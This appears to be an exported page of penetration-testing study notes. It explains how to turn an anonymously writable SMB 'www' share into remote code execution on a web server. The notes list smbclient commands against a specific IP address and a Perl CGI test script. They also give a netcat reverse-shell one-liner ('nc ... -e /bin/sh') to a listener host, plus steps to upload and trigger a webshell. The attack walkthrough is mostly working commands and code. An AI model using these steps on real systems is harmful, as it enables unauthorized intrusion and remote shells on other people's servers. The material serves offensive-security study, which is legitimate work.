<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>www writable share</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>www writable share</h1><br/><strong><h3>Prerequisites</h3></strong><br />• www writable share folder available to us<br />     <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># smbmap -H [ipAddress]</pre></div><br />    <a href=""><img src="images/1444-1.png" alt="images/1444-1.png" /></a><br />• Web server support interpreted(scripting) language<br />    Access to the access the &lt;writableTargetFolder&gt; share. Inside it we should have a “rootfs” directory(SMBTARGET)<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># smbclient <span style="color:#333333;font-weight:400">\\\\</span>81.249.228.239<span style="color:#333333;font-weight:400">\\</span>www -N      <span style="color:#0088ff;font-weight:400">#anonymous access </span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> recurse                                        <span style="color:#0088ff;font-weight:400">#enable recursion listing on smb</span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">ls</span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> recurse                                        <span style="color:#0088ff;font-weight:400">#disable recursion listing on smb</span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> mget &lt;Target Directory to Download&gt;</pre></div><br /><br />We have to ask to ourselves these questions:<br />1. Is a web server-interpreted languages we can use to our advantage? Check for these file extensions in the www share:<br />   ◇ PHP (*.php, *.php3, *.php4, *.phtml)<br />   ◇ Python (*.py) <br />   ◇ R (*.rhtml) <br />   ◇ Ruby (*.rb, *.rbw)<br />   ◇ JavaScript using Server-side JavaScript (*.ssjs, *.js) <br />   ◇ Perl via the CGI.pm module (*.cgi, *.ipl, *.pl)<br />   To inspect one of these file we can download it locally<br />        <div class="codebox"><pre>smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> get [<span style="color:#ff9d00;font-weight:700">file</span>]                                                       <span style="color:#0088ff;font-weight:400">#to download a file locally and inspect these files</span></pre></div><br />2. Can we upload any files to this(www) directory, and how will the web server handle our files?         <br />        <div class="codebox"><pre>smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> smbclient <span style="color:#333333;font-weight:400">\\\\</span>[targetIp]<span style="color:#333333;font-weight:400">\\</span>www -N                                 <span style="color:#0088ff;font-weight:400">#anonymous access</span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> put [<span style="color:#ff9d00;font-weight:700">file</span>]                                                       <span style="color:#0088ff;font-weight:400">#to upload a file on the target</span></pre></div><br />        the file that we will put, must be with a interpreted language. For example for perl upload a <code>test.pl</code> file with:<br />        <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/perl</span><br />print <span style="color:#3ad900;font-weight:400">&quot;Content-type: text/html\n\n&quot;</span><span style="color:#ff9d00;font-weight:700">;</span><br />system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;id&quot;</span><span style="color:#ff9d00;font-weight:700">);</span></pre></div><br />        or in alternative to directly put a bash reverse shell<br />        <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/perl</span><br />print <span style="color:#3ad900;font-weight:400">&quot;Content-type: text/html\n\n&quot;</span><span style="color:#ff9d00;font-weight:700">;</span><br />system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;nc 192.168.13.18 1234 -e /bin/sh&quot;</span><span style="color:#ff9d00;font-weight:700">)</span></pre></div><br />3. Check how the web server handle this script<br />    go with the browser to the web server of the target address, to the file uploaded<br />    <a href=""><img src="images/1444-2.png" alt="images/1444-2.png" /></a><br /><br />4. Can we exploit that to obtain remote command execution?<br />    If the command <code>id</code> is been displayed. this mean we can also upload a reverse shell.<br />    For a complete list of reverse shells see:<br />   ◇ <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br />   ◇ or directly on kali<br />        <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>webshells<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">ls</span></pre></div><br />        <a href=""><img src="images/1444-3.png" alt="images/1444-3.png" /></a><br />    These scripts needs small modifications before using it. <br />    <span style="color:#a5452a;">For example for a Perl reverse shell we have to edit Ip and Port.</span><br />    <a href=""><img src="images/1444-4.png" alt="images/1444-4.png" /></a><br />      <br />5. Now we have to upload the web reverse shell (On point 2 we have tested if the web server handle scripting language)<br />    <div class="codebox"><pre>smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> put [<span style="color:#ff9d00;font-weight:700">file</span>]                                                       <span style="color:#0088ff;font-weight:400">#to upload the web server reverse shell on the target</span></pre></div><br /><br />6. Listen and wait<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />    <a href=""><img src="images/1444-5.png" alt="images/1444-5.png" /></a><br />7. Now we have to navigate with the browser to the file we have uploaded to trigger the web reverse shell</div>
</body>
</html>
